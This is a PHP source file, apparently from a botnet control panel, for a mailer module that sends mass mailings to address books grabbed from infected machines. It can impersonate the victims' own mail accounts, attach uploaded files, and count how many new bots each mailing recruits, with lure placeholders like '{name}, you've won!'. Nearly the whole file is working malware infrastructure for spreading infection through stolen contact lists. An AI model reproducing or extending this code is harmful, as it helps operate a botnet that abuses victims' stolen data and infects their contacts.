<?php
require 'system/lib/dbpdo.php';
require 'system/lib/remscript-client.php';
require 'system/lib/guiutil.php';
require 'system/lib/report.php';

/**
 * @property string $attachments_path Path prefix for attachments storage
 */
class svc_mailerController {

    const ATTACHMENTS_DIR = 'svc_mailer/attachments';
    const SCRIPT_VERSION = '1.0.2';

    function __construct(){
        $this->db = dbPDO::singleton();
        $this->isAjax = $isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH']) AND strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';

        $this->attachments_path = $GLOBALS['config']['reports_path'].'/'.self::ATTACHMENTS_DIR.'/';
    }
    
    function _assets(){
        echo <<<HTML
        <link rel="stylesheet" href="theme/js/contextMenu/src/jquery.contextMenu.css" />
        <script src="theme/js/contextMenu/src/jquery.contextMenu.js"></script>
        <script src="theme/js/contextMenu/src/jquery.ui.position.js"></script>
        <script src="theme/js/page-svc_mailer.js"></script>
HTML;
    }

    function _client($script_url = null){
        return new RemScriptClient(is_null($script_url)? $GLOBALS['config']['mailer']['script_url'] : $script_url, array());
    }

    /**
     * Download the script
     */
    function actionDownload(){
        header('Content-disposition: attachment; filename=mailer.php');
        header('Content-type: text/x-php');

        readfile('system/lib/remscript-server.php'); echo '?>';
        readfile('system/lib/mailmessage.php'); echo '?>';
        readfile('system/utils/mailer.script.php');
    }

    /**
     * AJAX @ ajax_config:Mailer: check the mailer script
     */
    function actionAjax_Config_CheckScript($script_url = null){
        $client = $this->_client($script_url);
        echo '<table class="lined"><caption>', LNG_AJAX_SELFTEST, '</caption>';
        try {
            $ret = @$client->call('selftest', array(self::SCRIPT_VERSION));
            foreach ($ret as $name => $success){
                echo '<tr><th>', htmlspecialchars($name), '</th><td class="', $success? 'success' : 'failure', '">';
                if (is_bool($success))
                    echo $success?'yes':'no';
                else
                    echo var_export($success, 1);
                echo '</td></tr>';
            }
        } catch (RemScriptProtocolError $e) {
            echo '<tr><th>Connection</th><td class="failure">', htmlspecialchars($e->getMessage()), '</td></tr>';
        }
        echo '</table>';
    }

    /**
     * Page: Index
     */
    function actionIndex(){
        ThemeBegin(LNG_MM_SERVICE_MAILER, 0, getBotJsMenu('botmenu'), 0);

        # Permissions
        if ((!file_exists($this->attachments_path) && !mkdir($this->attachments_path, 0777, true) ) || !is_writable($this->attachments_path))
            flashmsg('err', LNG_FLASHMSG_MUST_BE_WRITABLE, array(':name' => $this->attachments_path));

        # Self-test
        if (empty($GLOBALS['config']['mailer']['script_url']))
            flashmsg('warn', LNG_FLASHMSG_NOT_CONFIGURED);
        else
            echo '<div id="selftest">', LNG_AJAX_SELFTEST, '... <img src="theme/throbber.gif" /></div>';

        # Tasks
        $this->actionIndex_Tasks();

        echo '<div align=right>',
            ' <a href="?m=/svc_mailer/download">', LNG_BTN_DOWNLOAD_SCRIPT, '</a>',
            ' <a href="?m=ajax_config&action=Mailer" class="ajax_colorbox">', LNG_BTN_CONFIG, '</a>',
            '</div>';

        # New form
        $this->actionIndex_newmailing();

        # Mail grabber
        $this->actionIndex_mailgrabber();

        # Finish
        $this->_assets();

        ThemeEnd();
    }

    #region Mailer
    /**
     * AJAX @ Index_Tasks: run a task
     */
    function actionAjaxTasks_run($id){
        $task_id = $id;

        # Fetch task
        $task = $this->db->query(
            'SELECT `data`
             FROM `svc_mail_tasks`
             WHERE `id` = :task_id
             ;', array(
            ':task_id' => $task_id
        ))->fetchColumn(0);
        if (!$task)
            throw new Exception('Task #'.$task_id.' does not exist!');
        $task = unserialize($task);

        # Fetch addresses not yet processed
        $task['to'] = array();
        $q = $this->db->query(
            'SELECT `id`, `email`, `name`
             FROM `svc_mail_emails`
             WHERE
                `tid`=:task_id AND
                `sent` IS NULL
            ;', array(
            ':task_id' => $task_id
        ));
        while ($r = $q->fetchObject())
            $task['to'][ $r->id ] = array($r->email, $r->name);
        if (empty($task['to']))
            return; # Nothing to send

        # Update etime: started
        $this->db->query(
            'UPDATE `svc_mail_tasks`
             SET `etime`=:now, `ftime`=NULL, `error`=NULL
             WHERE `id`=:task_id
             ;', array(
            ':task_id' => $task_id,
            ':now' => time(),
        ));

        # Send attachment files
        $upload_files = array();
        if (!empty($task['attachment']['path']))
            $upload_files['attachment'] = array(
                $this->attachments_path.'/'.$task['attachment']['path'],
                $task['attachment']['fname'],
                $task['attachment']['mime'],
            );

        # Send the task
        set_time_limit(60*60*5);
        ignore_user_abort(true);
        try {
            $client = $this->_client();
            $response = $client->call(
                'Send',
                array(
                    'message' => $task['message'],
                    'subject' => $task['subj'],
                    'sender' => $task['from'],
                    'receivers' => $task['to'],
                    'send_delay' => isset($GLOBALS['config']['mailer']['send_delay'])? $GLOBALS['config']['mailer']['send_delay'] : 0,
                ),
                null,
                $upload_files,
                60*60*5
            );

            # Account the success
            $q = $this->db->prepare(
                'UPDATE `svc_mail_emails`
             SET `sent`=:now, `error`=NULL
             WHERE `tid`=:task_id AND `id`=:id
             ;');
            foreach ($response as $i => $sent)
                $q->execute(array(
                    ':now' => time(),
                    ':task_id' => $task_id,
                    ':id' => $i
                ));

            # Update ftime: finished
            $this->db->query(
                'UPDATE `svc_mail_tasks`
             SET `ftime`=:now
             WHERE `id`=:task_id
             ;', array(
                ':task_id' => $task_id,
                ':now' => time(),
            ));
        } catch (RemScriptError $e){
            $this->db->query(
                'UPDATE `svc_mail_tasks`
                 SET `error`=:error
                 WHERE `id`=:task_id
                 ;', array(
                    ':error' => $e->getMessage(),
                    ':task_id' => $task_id,
                ));
        }

        header('Location: ?m=svc_mailer/index');
    }

    /**
     * AJAX @ Index_Tasks: reset a task so it can be run from scratch
     */
    function actionAjaxTasks_reset($id){
        # Update the task
        $this->db->query(
            'UPDATE `svc_mail_tasks`
             SET `etime`=NULL, `ftime`=NULL, `error`=NULL
             WHERE `id`=:id
             ;', array(
            ':id' => $id,
        ));

        # Update emails
        $this->db->query(
            'UPDATE `svc_mail_emails`
             SET `sent`=NULL, `error`=NULL
             WHERE `tid`=:id
             ;', array(
            ':id' => $id,
        ));
    }

    /**
     * AJAX @ Index_Tasks: remove a task
     */
    function actionAjaxTasks_delete($id){
        $this->db->query(
            'DELETE FROM `svc_mail_tasks`
             WHERE `id`=:id
             ;', array(
            ':id' => $id,
        ));
    }

    /**
     * PARTIAL @ Index: display the history table
     */
    function actionIndex_Tasks(){
        $q = $this->db->query(
            'SELECT
                `t`.*,
                COUNT(`e`.`id`) AS `email_count`,
                SUM(`e`.`sent` IS NOT NULL) AS `email_sent`,
                (SELECT COUNT(*) FROM `botnet_list` `bl` WHERE `t`.`botnet` IS NOT NULL AND `bl`.`botnet` = `t`.`botnet`) AS `newbots_count`

             FROM `svc_mail_tasks` `t`
                LEFT JOIN `svc_mail_emails` `e` ON(`t`.`id` = `e`.`tid`)
             GROUP BY `t`.`id`
             ORDER BY `t`.`ctime` DESC
             ;');

        echo '<table class="lined zebra" id="tasks">',
            '<caption>', LNG_SVC_MAIL_HISTORY, '</caption>',
            '<THEAD>',
                '<tr>',
                    '<th>', LNG_SVC_MAIL_HISTORY_TH_DATE, '</th>',
                    '<th>', LNG_SVC_MAIL_HISTORY_TH_STATUS, '</th>',
                    '<th>', LNG_SVC_MAIL_HISTORY_TH_SUBJECT, '</th>',
                    '<th>', LNG_SVC_MAIL_HISTORY_TH_BOTID, '</th>',
                    '<th>', LNG_SVC_MAIL_HISTORY_TH_COMMENT, '</th>',
                    '<th>', LNG_SVC_MAIL_HISTORY_TH_ADDRESSES, '</th>',
                    '<th>', LNG_SVC_MAIL_HISTORY_TH_BOTNET, '</th>',
                    '<th>', LNG_SVC_MAIL_HISTORY_TH_NEWBOTS, '</th>',
                '</tr>',
            '</THEAD>'
        ;
        echo '<TBODY>';
        while ($r = $q->fetchObject()){
            # State
            $classes = array();
            $state = '';
            if (!is_null($r->ftime)) {
                $classes[] = 'finished';
                $state = LNG_SVC_MAIL_HISTORY_STATUS_FINISHED;
            } elseif (!is_null($r->etime)){
                $classes[] = 'pending';
                $state = LNG_SVC_MAIL_HISTORY_STATUS_PENDING;
                $state .= ' '.$r->email_sent.'/'.$r->email_count;
            } else {
                $classes[] = 'idle';
                $state = LNG_SVC_MAIL_HISTORY_STATUS_IDLE;
            }

            # Error?
            if (!is_null($r->error)) {
                $classes[] = 'error';
                $state = LNG_SVC_MAIL_HISTORY_STATUS_ERROR.': '.htmlspecialchars($r->error);
            }

            # Data
            echo '<tr class="', implode(' ', $classes), '" data-ajax="id=', $r->id, '">';
            echo '<td>', date('d.m.Y H:i:s', $r->ctime), '</td>'; # Ctime
            echo '<td>', htmlspecialchars($state), '</td>'; # Status
            echo '<td>', htmlspecialchars($r->subj), '</td>'; # Subject
            echo '<td>', is_null($r->botId)? ' - ' : botPopupMenu($r->botId, 'botmenu'), '</td>'; # BotID
            echo '<td>', htmlspecialchars($r->comment), '</td>'; # Comment
            echo '<td>', ($r->email_sent == $r->email_count)? $r->email_sent : "{$r->email_sent} / {$r->email_count}", '</td>'; # Addresses: sent
            echo '<td>', htmlspecialchars($r->botnet), '</td>'; # Botnet
            echo '<td>', $r->newbots_count, ' ', '(', $r->email_count>0 ? round(100*$r->newbots_count/$r->email_count,1) : 0, '%)', '</td>'; # New bots
            echo '</tr>';
        }
        echo '</TBODY>';
        echo '</table>';

        echo LNG_HINT_CONTEXT_MENU;
    }

    /**
     * PARTIAL @ Index: display a form to create a new mailing
     */
    function actionIndex_newmailing(){
        echo '<h3 class="td_header">', LNG_SVC_MAIL_MAILING_NEW, '</h3>';

        echo '<form method=GET><input type="hidden" name="m" value="svc_mailer/new" />',
            '<dl>',
                '<dt>', 'BotId', '</dt>',
                    '<dd>', '<input type="text" name="botId" size=60 />', '</dd>',
                '</dl>',
             '<div class="hint">', LNG_SVC_MAIL_MAILING_NEW_HINT, '</div>',
             '<input type="submit" value="', LNG_SVC_MAIL_MAILING_NEW_BTN_PARSE, '" />',
             ' ', LNG_SVC_MAIL_MAILING_NEW_BTN_OR, ' ',
             '<input type="submit" value="', LNG_SVC_MAIL_MAILING_NEW_BTN_MANUAL, '" />',
             '</form>';
    }



    /**
     * Page: New
     */
    function actionNew($botId = null, $id = null){
        $data = array(
            'botId' => $botId,
            'comment' => '',
            'botnet' => '',

            'from' => array(), # [ email , name? ]
            'to' => array(), # [ [email, name? ], .. ]
            'subj' => '', # string
            'format' => 'html', # 'html', 'plain', 'both'
            'message' => array('html' => '', 'plain' => ''),
            'attachment' => array('path' => null, 'mime' => null, 'fname' => ''),
        );

        # Post handling

        if (!empty($_POST['data'])){
            # BotId, Comment, Botnet
            $data['botId'] = $botId;
            $data['comment'] = $_POST['data']['comment'];
            $data['botnet'] = $_POST['data']['botnet'];

            # Parse the sender
            $l = $_POST['data']['from'];
            $data['from'] = strpos($l, ';') === FALSE ? array(trim($l), null) : array_reverse(array_map('trim', explode(';', $l, 2)));

            # Parse the list of receivers
            $data['to'] = array();
            foreach (array_filter(array_map('trim', explode("\n", $_POST['data']['to']))) as $l)
                $data['to'][] = strpos(trim($l), ';') === FALSE ? array($l, null) : array_reverse(array_map('trim', explode(';', $l, 2)));

            # Subject, Format, Message
            $data['subj'] = $_POST['data']['subj'];
            $data['format'] = $_POST['data']['format'];
            $data['message'] = $_POST['data']['message'];

            # Restrict format if not both
            if ($data['format'] != 'both')
                if (isset($data['message'][  $data['format']  ])) # make sure the format key exists
                    $data['message'] = array( $data['format'] => $data['message'][  $data['format']  ]);

            # Attachment
            $data['attachment']['fname'] = $_POST['data']['attachment']['fname'];
            if (isset($_FILES['data']['error']['attachment']['path']) && $_FILES['data']['error']['attachment']['path'] == UPLOAD_ERR_OK){
                # Provide a default for the filename
                if (empty($data['attachment']['fname']))
                    $data['attachment']['fname'] = basename($_FILES['data']['name']['attachment']['path']);
                # Save the attachment
                $attachment_path = uniqid().strrchr($data['attachment']['fname'], '.');
                if (move_uploaded_file($_FILES['data']['tmp_name']['attachment']['path'], $this->attachments_path.'/'.$attachment_path)){
                    $data['attachment']['path'] = $attachment_path;
                    $data['attachment']['mime'] = $_FILES['data']['type']['attachment']['path'];
                }
            }

            # Store as a task
            $this->db->query(
                'INSERT INTO `svc_mail_tasks`
                 SET
                    `botId` = :botId, `subj` = :subj, `comment` = :comment,
                    `botnet` = :botnet, `data` = :data,
                    `ctime` = :ctime
                 ;', array(
                ':botId' => $botId,
                ':subj' => $data['subj'],
                ':comment' => $data['comment'],
                ':botnet' => $data['botnet'],
                ':data' => serialize($data),
                ':ctime' => time(),
            ));
            $task_id = $this->db->lastInsertId();

            # Store receipients
            $q = $this->db->prepare('INSERT INTO `svc_mail_emails` SET `tid`=:task_id, `name`=:name, `email`=:email');
            foreach ($data['to'] as $recipient)
                $q->execute(array(
                    ':task_id' => $task_id,
                    ':name' => $recipient[1],
                    ':email' => $recipient[0]
                ));

            # Redirect
            #header('Location: ?m=svc_mailer/index&runTask='.$task_id);
            header('Location: ?m=svc_mailer/AjaxTasks_run&id='.$task_id);

            return;
        }

        ThemeBegin(LNG_MM_SERVICE_MAILER, 0, getBotJsMenu('botmenu'), 0);
        $accounts = array();

        # Preseed
        if (!empty($id)){
            $q = $this->db->query(
                'SELECT *
                 FROM `svc_mail_tasks`
                 WHERE `id` = :id
                ;', array(
                ':id' => $id,
            ));
            $r = $q->fetchObject();
            if ($r){
                $d = unserialize($r->data);
                $data['subj'] = $d['subj'];
                $data['format'] = $d['format'];
                $data['message'] = $d['message'] + $data['message'];
                $data['attachment']['fname'] = $d['attachment']['fname'];
            }
        }

        # Check if there already was a mailing for this bot
        if (!empty($botId)){
            $q = $this->db->query(
                'SELECT EXISTS(
                    SELECT 1
                    FROM `svc_mail_tasks`
                    WHERE `botId`=:botId
                );', array(
                ':botId' => $botId,
            ));
            if ($q->fetchColumn(0) == 1)
                flashmsg('warn', LNG_SVC_MAIL_MAILING_NEW_FLASHMSG_BOTID, array('{botId}' => $botId));
        }

        # Parse addresses for the bot
        if (empty($data['to']) && !empty($botId)){
            list($accounts, $data['to']) = $this->_parse_email_addresses($botId);
            if (count($accounts) == 1)
                $data['from'] = array_shift($accounts);
        }

        # Add the master's e-mail to the list of receivers
        if (!empty($GLOBALS['config']['mailer']['master_email']))
            array_unshift($data['to'], $GLOBALS['config']['mailer']['master_email']);

        # Prepare the $accounts HTML form
        $accounts_html = array();
        foreach ($accounts as $option)
            $accounts_html[] = sprintf('<li><label><input type="radio" name="account" value="%s">%s</label></li>', htmlspecialchars($option), htmlspecialchars($option));
        $accounts_html = implode($accounts_html);

        # Display the edit form
        echo '<form id="new_mailing" action="?m=svc_mailer/new&botId=', urlencode($botId), '" method="POST" enctype="multipart/form-data" class="w100" style="width: 800px;">',
            '<dl>',
                '<dt>', LNG_SVC_MAIL_MAILING_NEW_COMMENT, '</dt>',
                    '<dd>',
                        '<input type="text" name="data[comment]" />',
                        '</dd>',
                '<dt>', LNG_SVC_MAIL_MAILING_NEW_BOTNET, '</dt>',
                    '<dd>',
                        '<input type="text" name="data[botnet]" />',
                        '</dd>',
                '<dt>', LNG_SVC_MAIL_MAILING_NEW_RECIPIENTS, '</dt>',
                    '<dd>',
                        '<textarea name="data[to]" rows=10 cols=80 placeholder="Cynthia Powell ; cpowell@gmail.com"></textarea>',
                        '<div class="hint">', LNG_SVC_MAIL_MAILING_NEW_RECIPIENTS_HINT, '</div>',
                        '</dd>',
                '<dt>', LNG_SVC_MAIL_MAILING_NEW_SENDER, '</dt>',
                    '<dd id="from">',
                        '<input type="text" name="data[from]" placeholder="John Lennon ; jlennon@{hostname}" />',
                        '<div class="hint">', LNG_SVC_MAIL_MAILING_NEW_SENDER_HINT, '</div>',
                        '<ul id="accounts">', $accounts_html, '</ul>',
                        '</dd>',
                '<dt>', LNG_SVC_MAIL_MAILING_NEW_SUBJECT, '</dt>',
                    '<dd>',
                        '<input type="text" name="data[subj]" placeholder="{name}, you\'ve won!" />',
                        '<div class="hint">', LNG_SVC_MAIL_MAILING_NEW_SUBJECT_HINT, '</div>',
                        '</dd>',
                '<dt>', LNG_SVC_MAIL_MAILING_NEW_MESSAGE_FORMAT, '</dt>',
                    '<dd id="format">',
                        '<label><input type="radio" name="data[format]" value="html" /> HTML </label> ',
                        '<label><input type="radio" name="data[format]" value="plain" /> Text </label> ',
                        '<label><input type="radio" name="data[format]" value="both" /> HTML + Text </label> ',
                        '</dd>',
                '<dt>', LNG_SVC_MAIL_MAILING_NEW_MESSAGE, '</dt>',
                    '<dd id="message">',
                        '<ul id="message-formats">',
                            '<li class="html both"><textarea name="data[message][html]" rows=10 cols=80 placeholder="Hi, {name}! Your email is {email}. Random bytes: {random}"></textarea>',
                            '<li class="plain both"><textarea name="data[message][plain]" rows=10 cols=80 placeholder="Hi, {name}! Your email is {email}. Random bytes: {random}"></textarea> <a href="#">[ Auto ]</a> ',
                            '</ul>',
                        '<div class="hint">', LNG_SVC_MAIL_MAILING_NEW_MESSAGE_HINT, '</div>',
                        '</dd>',
                '<dt>', LNG_SVC_MAIL_MAILING_NEW_ATTACHMENT, '</dt>',
                    '<dd id="attachment">',
                        '<p><input type="file" name="data[attachment][path]" />',
                        '<p>', LNG_SVC_MAIL_MAILING_NEW_ATTACHMENT_FILENAME, ': <input type="text" name="data[attachment][fname]" />',
                        '</dd>',
                '</dl>',
            '<input type="submit" value="', LNG_SVC_MAIL_MAILING_NEW_BUTTON_SEND, '" />',
            '</form>';

        echo js_form_feeder('#new_mailing', array(
            'data[comment]' => $data['comment'],
            'data[botnet]' => $data['botnet'],
            'data[to]' => implode("\n", $data['to']),
            'data[from]' => $data['from'],
            'data[subj]' => $data['subj'],
            'data[format]' => $data['format'],
            'data[message][html]' => $data['message']['html'],
            'data[message][plain]' => $data['message']['plain'],
            'data[attachment][fname]' => $data['attachment']['fname'],
        ));

        $this->_assets();
        echo <<<HTML
        <script type="text/javascript" src="theme/js/tinymce/jscripts/tiny_mce/tiny_mce.js"></script>
        <script type="text/javascript" src="theme/js/tinymce/jscripts/tiny_mce/jquery.tinymce.js"></script>
HTML;


        ThemeEnd();
    }

    /** Parse botnet reports of type BLT_GRABBED_EMAILSOFTWARE and gather e-mail addresses
     * @param string|null $botId The botId to parse, or `null` to parse all
     * @param bool $recent `true` to parse only a single recent report, `false` to get them all
     * @return string[][] Array( accounts: string[], addresses: string[] )
     *      Accounts:
     *      Addresses:
     */
    protected function _parse_email_addresses($botId = null, $recent = true){
        $accounts = array();
        $addresses = array();

        foreach (array_reverse($this->db->report_tables()) as $t){
            $q = $this->db->query(
                "SELECT `context`
                  FROM `$t` `t`
                  WHERE
                    `type`=:type AND
                    (:botId IS NULL OR `bot_id`=:botId)
                 ;", array(
                ':type' => BLT_GRABBED_EMAILSOFTWARE,
                ':botId' => $botId,
            ));

            # Parse
            $accs = array();
            $addrs = array();
            while ($context = $q->fetchColumn(0)){
                $report = new Report_Email_Parser($context);
                $addrs = array_merge($addresses, $report->addresses);
                foreach ($report->accounts as $acc)
                    $accs[] = $acc->email;
            }

            # Merge & Uniquify.
            # While merging, preserve the reverse-time ordering
            $accounts = array_unique(array_merge(array_reverse($accs), $accounts));
            $addresses = array_unique(array_merge(array_reverse($addrs), $addresses));

            # Recent?
            if ($recent)
                break; # Don't look through all the tables: we're okay with a single result
        }

        return array($accounts, $addresses);
    }
    #endregion



    #region Mailgrabber
    /**
     * PARTIAL @ Index: mailgrabber
     */
    function actionIndex_mailgrabber(){
        echo '<h3 class="td_header">', LNG_AJAX_MAILGRABBER, '</h3>';
        echo "<a href='?m=svc_mailer/mailgrabber' id='mailgrabber' target='_blank'>Search</a>";
    }

    function actionMailgrabber(){
        themeSmall(LNG_AJAX_MAILGRABBER, '', 0, getBotJsMenu('botmenu'), 0);

        list($accounts, $addresses) = $this->_parse_email_addresses(null, false);

        echo '<table id="mailgrabber-results">';
        echo '<THEAD>', '<tr>',
                '<th>Bot Accounts</th>',
                '<th>Addresses</th>',
            '</tr></THEAD>';
        echo '<TBODY>';
        echo '<tr>',
            '<td>', implode("<p>", array_map('htmlspecialchars', $accounts)), '</td>',
            '<td>', implode("<p>", array_map('htmlspecialchars', $addresses)), '</td>',
            '</tr>';
        echo '</TBODY>';

        ThemeEnd();
    }
    #endregion
}
